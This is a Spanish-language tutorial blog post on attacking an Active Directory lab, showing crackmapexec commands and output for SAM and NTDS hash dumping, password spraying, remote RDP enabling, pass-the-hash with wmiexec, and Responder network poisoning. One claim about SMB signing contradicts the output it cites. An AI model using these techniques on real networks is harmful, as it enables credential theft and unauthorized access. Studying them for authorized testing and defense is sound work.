---
title: Pentesting Active Directory
date: 2023-09-01 9:00:00
categories: [Active Directory, Windows, Apuntes]
tags: [ad, active directory, windows, windows server, tutorial]    
author: Waidroc
---


![Titulo!](/assets/img/2023-09-01/ad_titulo.jpg)


Esta vez, vamos a explorar diversas estrategias, enfoques y metodologías más comunes y efectivas para llevar a cabo pruebas de penetración en entornos de Active Directory. ¡Comencemos!

<h2> ¿Qué es Active Directory? </h2>

Active Directory (AD) es un servicio de directorio desarrollado por Microsoft que actúa como un sistema centralizado para `administrar y organizar recursos` en una red. Funciona como una base de datos `jerárquica` que almacena información sobre usuarios, grupos, dispositivos y recursos en una red, permitiendo un acceso y una administración eficiente de los recursos.

Su importancia a nivel empresarial radica en que proporciona una `estructura organizativa` para la gestión de usuarios y recursos de TI. Permite a las organizaciones establecer políticas de seguridad, asignar permisos y derechos de acceso, y gestionar de manera centralizada la autenticación y autorización en toda la red. Además, facilita la administración de sistemas, la implementación de políticas de grupo y la gestión de software a través de la red, lo que ahorra tiempo y recursos en entornos empresariales de cualquier tamaño.

<h2> ¿Qué vamos a ver en este post?</h2>

⧫ Crackmapexec enumeration
⧫ SMB Relay
⧫ Pass The Hash
⧫ Grabbing info from users
⧫ LDAP Enumeration
⧫ Kerbrute
⧫ Kerberoasting
⧫ AS-REP Roast
⧫ Golden Ticket
⧫ Rubeus - Kerberoasting
⧫ Rubeus - AS-REP Roast
⧫ SCF Files
⧫ Bloodhound & neo4j

# CrackMapExec enumeration

- - -

![CME!](/assets/img/2023-09-01/cme.png)

Esta es la herramienta más utilizada para el pentesting en Active Directory, ya que `enumera` los servicios más comunes. A pesar de esto, es bastante sencilla de usar. Veamos que podemos realizar con esta `navaja suiza`:

## SMB Enumeration

- - -

`SMB` es un protocolo utilizado por sistemas Windows para compartir archivos e impresoras, así como para otras funciones. Es una parte esencial de muchas redes y uno de los servicios más comunes que se ejecutan. Existen varias herramientas para enumerar SMB, como `smbclient` o `smbmap`. Pero crackmapexec es mi favorita por muchas razones. Hablemos de ellas:

### Network information

- - -

Utilizar `crackmapexec` de la manera más sencilla puede proporcionarte información como el dominio del Controlador de Dominio (DC), la firma SMB (la cual comprobaremos en el SMB Relay) o el nombre del host.

```zsh
❯ cme smb 192.168.10.1/24
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
```

De esta forma, podríamos ver los hosts con Windows que están conectados a la red. Podemos ver que el Controlador de Dominio (192.168.10.115) tiene la firma SMB, pero eso no importa si los otros PCs conectados al Controlador de Dominio no tienen la misma firma.

### Dumping SAM

- - -

Si sabemos las credenciales de uno de los usuarios del sistema, podemos dumpear el fichero `SAM`, el cual contiene las contraseñas en forma de hash (NTLM) de las cuentas de usuario locales.

```zsh
❯ cme smb 192.168.10.1/24 -u usuario -p 'Password2' --sam
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Dumping SAM hashes
SMB         192.168.10.120   445    W3-PC        Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.120   445    W3-PC        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
SMB         192.168.10.120   445    W3-PC        Cordy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.10.120   445    W3-PC        [+] Added 5 SAM hashes to the database
```
Aquí podemos observar que al saber la contraseña de `usuario`, podemos ver y dumpear el fichero SAM del host W3-PC, obteniendo los hashes de sus cuentas de usuario local. Ahora, si esas contraseñas son "flojas" y pueden obtenerse fácilmente con un ataque de fuerza bruta o de diccionario, nos podríamos hacer con el control total del sistema.

### Share enumeration

- - -

```zsh
❯ cme smb 192.168.10.1/24 -u cordy -p 'Password1' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\cordy:Password1 
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$                          Admin remota
SMB         192.168.10.120   445    W3-PC        C$                              Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
                                                                                                                                                                                                                                
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' --shares
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SMB         192.168.10.110   445    W1-PC        [+] Enumerated shares
SMB         192.168.10.110   445    W1-PC        Share           Permissions     Remark
SMB         192.168.10.110   445    W1-PC        -----           -----------     ------
SMB         192.168.10.110   445    W1-PC        ADMIN$                          Admin remota
SMB         192.168.10.110   445    W1-PC        C$                              Recurso predeterminado
SMB         192.168.10.110   445    W1-PC        IPC$            READ            IPC remota
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] Enumerated shares
SMB         192.168.10.115   445    W2-PC  Share           Permissions     Remark
SMB         192.168.10.115   445    W2-PC  -----           -----------     ------
SMB         192.168.10.115   445    W2-PC  ADMIN$                          Remote Admin
SMB         192.168.10.115   445    W2-PC  C$                              Default share
SMB         192.168.10.115   445    W2-PC  IPC$            READ            Remote IPC
SMB         192.168.10.115   445    W2-PC  NETLOGON        READ            Logon server share 
SMB         192.168.10.115   445    W2-PC  SYSVOL          READ            Logon server share 
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] Enumerated shares
SMB         192.168.10.120   445    W3-PC        Share           Permissions     Remark
SMB         192.168.10.120   445    W3-PC        -----           -----------     ------
SMB         192.168.10.120   445    W3-PC        ADMIN$          READ,WRITE      Admin remota
SMB         192.168.10.120   445    W3-PC        C$              READ,WRITE      Recurso predeterminado
SMB         192.168.10.120   445    W3-PC        IPC$            READ            IPC remota
```

De nuevo, podemos observar de nuevo que el usuario `usuario` tiene permisos de administrador sobre el usuario `cordy`. Esta salida nos muestra el tipo de permisos sobre los recursos compartidos (si los hay).

### Spidering

- - -

Una de las opciones más importantes que nos brinda `cme` es un módulo llamado `spider_plus`, ya que explora todos los recursos compartidos y directorios que hay en su interior de manera recursiva, proporcionándonos así un resultado ordenado y muy visual, mostrándonos todos los ficheros visibles en cada recurso compartido. 

Este módulo nos agiliza y facilita la tarea, ya que no tenemos que acceder a cada uno de los recursos compartidos para enumerar todos los directoriso y ficheros que contienen manualmente. Veamos un ejemplo:

```zsh
❯ cme smb 192.168.0.1/24 -u usuario -p 'Password2' -M spider_plus
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.110   445    W1-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.110   445    W1-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.110   445    W1-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SPIDER_P... 192.168.10.120   445    W3-PC        [*] Started spidering plus with option:
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        DIR: ['print$']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.120   445    W3-PC        [*]       SIZE: 51200
SPIDER_P... 192.168.10.120   445    W3-PC        [*]     OUTPUT: /tmp/cme_spider_plus
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SPIDER_P... 192.168.10.115   445    W2-PC  [*] Started spidering plus with option:
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        DIR: ['print$']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 192.168.10.115   445    W2-PC  [*]       SIZE: 51200
SPIDER_P... 192.168.10.115   445    W2-PC  [*]     OUTPUT: /tmp/cme_spider_plus
```

### Authentication sprying

- - -

Ahora, imaginemos que tenemos la credencial del usuario `Administrator`, el cual es el administrador del dominio. Lo hemos obtenido con un ataque `SMB Relay`.
Pues, con `crackmapexec`, podríamos realizar un ataque de `password spraying` para ver en qué sistemas puedes conectarte. Veamos:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P4$$W0rd!!!#'
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
```

En este caso, al ser administradores del DC, nos podemos conectar a todos y cada uno de los hosts que hay en la red. Ahora, podríamos habilitar el protocolo `rdp` en todos los sistemas para podernos conectar a ellos vía `pth-winexe`:

```zsh
❯ cme smb 192.168.0.1/24 -u Administrator -p 'P4$$W0rd!!!#' -M rdp -o action=enable
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
RDP         192.168.10.110   445    W1-PC        [+] RDP enabled successfully
RDP         192.168.10.120   445    W3-PC        [+] RDP enabled successfully
RDP         192.168.10.115   445    W2-PC  [+] RDP enabled successfully
```

# Pass The Hash

- - -

Ahora, podemos volcar el fichero `NTDS` y obtener el hash. Nuestra víctima será el usuario `usuario`:

```zsh
❯ cme smb 192.168.10.115 -u Administrator -p 'P4$$W0rd!!!#' --ntds vss
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\Administrator:P4$$W0rd!!!# (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.10.115   445    W2-PC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
SMB         192.168.10.115   445    W2-PC  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.10.115   445    W2-PC  W2-PC$:1000:aad3b435b51404eeaad3b435b51404ee:4054f61d8984e3d043fe140d9a78fea2:::
SMB         192.168.10.115   445    W2-PC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:acf2d0133c0db165efbca5b44072e10a:::
SMB         192.168.10.115   445    W2-PC  waidroc.local\cordy:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.10.115   445    W2-PC  W3-PC$:1104:aad3b435b51404eeaad3b435b51404ee:ab1687ba2fe14303e8a2db5d154f7aa8:::
SMB         192.168.10.115   445    W2-PC  waidroc.local\usuario:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         192.168.10.115   445    W2-PC  W1-PC$:1107:aad3b435b51404eeaad3b435b51404ee:5b8bfc212d142cedbcd2edcb5937a38a:::
SMB         192.168.10.115   445    W2-PC  [+] Dumped 8 NTDS hashes to /root/.cme/logs/W2-PC_192.168.10.115_2023-05-25_164328.ntds of which 5 were added to the database
```

De esta forma, podemos obtener el hash del usuario víctima y conectarnos al host con `wmiexec`:

```zsh
❯ wmiexec.py waidroc.local/usuario@192.168.10.120 -hashes aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
waidroc\usuario
C:\>ipconfig
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec

Configuraci�n IP de Windows


Adaptador de Ethernet Ethernet:

   Sufijo DNS espec�fico para la conexi�n. . : 
   V�nculo: direcci�n IPv6 local. . . : fe80::7024:cc60:3dde:1db6%8
   Direcci�n IPv4. . . . . . . . . . . . . . : 192.168.10.120
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : 192.168.10.1

```

De esta forma, estaremos ejecutando comandos como `usuario` en el host W3-PC, con privilegios de administrador.

# SMB Relay

- - -

![SMBRelay!](/assets/img/2023-09-01/smbrelay.png)

Este es el ataque más común y a su vez, el primero que debemos de ejecutar cuando estamos haciendo una auditoría al Controlador de Dominio.


## ¿Qué es un ataque SMB Relay?

Un ataque `SMB Relay` lo realizamos cuando nosotros, como atacantes, capturamos un hash NTLMv2 de algún usuario y así poder interceptar y redirigir solicitudes de autenticación SMB de un host a otro, aprovechando así las funcionalidades de confianza mutua en redes locales. 

Así, engañamos a una máquina víctima para que envíe sus credenciales de autenticación al atacante, en lugar de al servidor o recurso legítimo para así, poder utilizar posteriormente esas credenciales para acceder a sistemas o recursos a los que la víctima tenía acceso, consiguiendo una escalada de privilegios a nivel de red.

## Prerrequisitos

- `SMB` no firmado.
- Debe de realizarse en una red local.
- Las credenciales de usuario deben tener acceso de inicio de sesión remoto, por ejemplo, ser administrador local en la máquina objetivo o ser miembro del grupo de Administradores del Dominio.


## SMB Signing

- - -

### ¿Qué hace?

- - -

La firma del SMB, verifica el `origen y la autenticidad` de los paquetes SMB. Efectivamente, esto cancela todo tipo de ataque `MITM`, como el ataque SMB relay desde su inicio. Si está activado no podremos realizar el ataque.

Podemos comprobar si este servicio esta activado con `cme`.

### Prueba de Concepto (PoC)

- - -

```zsh
❯ cme smb 192.168.0.1/24
SMB         192.168.0.114   445    WIN-23Q9AFM8V9R  [*] Windows 10.0 Build 17763 x64 (name:WIN-23Q9AFM8V9R) (domain:test.local) (signing:True) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
```

Aquí podemos ver que tenemos `2 DCs`:

- `test.local` (192.168.0.114)
- `waidroc.local` (192.168.10.115)

En ambos casos, SMB no esta firmado, por consecuente, podríamos realizar el ataque sin problemas:

Primero, con la herramienta `responder`, envenenamos la red:

```zsh
❯ responder -I wlan0 -dw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.105]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-NDF5GOK02C8]
    Responder Domain Name      [97ZB.LOCAL]
    Responder DCE-RPC Port     [45364]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.10.1, now waiting for incoming requests...
```








